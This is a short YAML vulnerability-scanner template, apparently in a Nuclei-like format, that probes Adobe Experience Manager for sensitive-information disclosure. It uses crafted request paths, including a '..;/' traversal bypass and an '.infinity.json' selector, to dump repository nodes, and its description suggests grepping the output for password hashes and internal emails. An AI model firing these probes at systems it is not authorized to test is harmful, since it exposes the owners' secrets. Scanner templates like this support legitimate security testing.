id: aem-secrets
brief:
    title: AEM Secrets - Sensitive Information Disclosure
    by: boobooHQ
    level: high
    about: Possible Juicy Files can be discovered at this endpoint. Search / Grep for secrets like hashed passwords ( SHA ) , internal email disclosure etc.
    label:
        - aem
        - adobe
        - misconfig
        - exposure
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json'
        - '{{BaseURL}}/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json'
      head:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Language: en-US,en;q=0.9,hi;q=0.8
      signs:
        - "on": word
          has:
            - '"jcr:uuid"'
            - '"jcr:createdBy"'
            - '"uri"'
          in: body
          need: all
        - "on": word
          has:
            - application/json
          in: header
          need: all
        - "on": status
          status:
            - 200
